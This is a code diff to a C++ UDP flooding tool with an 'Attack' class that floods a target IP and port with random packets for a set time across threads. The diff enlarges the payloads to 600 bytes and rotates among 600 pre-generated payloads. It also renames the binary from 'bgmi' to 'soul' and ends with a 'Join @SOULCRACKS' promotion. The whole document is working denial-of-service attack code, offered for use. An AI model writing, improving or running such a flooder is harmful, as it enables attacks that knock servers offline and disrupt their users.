@@ -14,20 +14,26 @@
     #include <unistd.h>
 #endif
 
-#define PAYLOAD_SIZE 20
+#define PAYLOAD_SIZE 600  // Updated payload size to 600 bytes
+#define NUM_PAYLOADS 600  // Number of payloads to generate
+
 class Attack {
 public:
     Attack(const std::string& ip, int port, int duration)
-        : ip(ip), port(port), duration(duration) {}
+        : ip(ip), port(port), duration(duration) {
+        // Generate 600 distinct payloads
+        for (int i = 0; i < NUM_PAYLOADS; i++) {
+            char payload[PAYLOAD_SIZE + 1];
+            generate_payload(payload, PAYLOAD_SIZE);
+            payloads.push_back(std::string(payload));
+        }
+    }
 
     void generate_payload(char *buffer, size_t size) {
         for (size_t i = 0; i < size; i++) {
-            buffer[i * 4] = '\\';
-            buffer[i * 4 + 1] = 'x';
-            buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
-            buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
+            buffer[i] = "0123456789abcdef"[rand() % 16];
         }
-        buffer[size * 4] = '\0';
+        buffer[size] = '\0'; // Null-terminate the string for safety
     }
 
     void attack_thread() {
@@ -35,9 +41,6 @@ public:
         struct sockaddr_in server_addr;
         time_t endtime;
         
-        char payload[PAYLOAD_SIZE * 4 + 1];
-        generate_payload(payload, PAYLOAD_SIZE);
-
         if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
             perror("Socket creation failed");
             pthread_exit(NULL);
@@ -50,8 +53,10 @@ public:
 
         endtime = time(NULL) + duration;
         while (time(NULL) <= endtime) {
-            ssize_t payload_size = strlen(payload);
-            if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+            // Choose a random payload from the list of 600
+            std::string payload = payloads[rand() % NUM_PAYLOADS];
+            ssize_t payload_size = payload.size();
+            if (sendto(sock, payload.c_str(), payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                 perror("Send failed");
                 close(sock);
                 pthread_exit(NULL);
@@ -65,6 +70,7 @@ private:
     std::string ip;
     int port;
     int duration;
+    std::vector<std::string> payloads; // Store the 600 payloads
 };
 
 void handle_sigint(int sig) {
@@ -73,7 +79,7 @@ void handle_sigint(int sig) {
 }
 
 void usage() {
-    std::cout << "Usage: ./bgmi ip port duration threads\n";
+    std::cout << "Usage: ./soul ip port duration threads\n";
     exit(1);
 }
 
@@ -115,4 +121,3 @@ int main(int argc, char *argv[]) {
     std::cout << "Attack finished. Join @SOULCRACKS\n";
     return 0;
 }
-//g++ -std=c++14 soulcracks.cpp -o soul -pthread
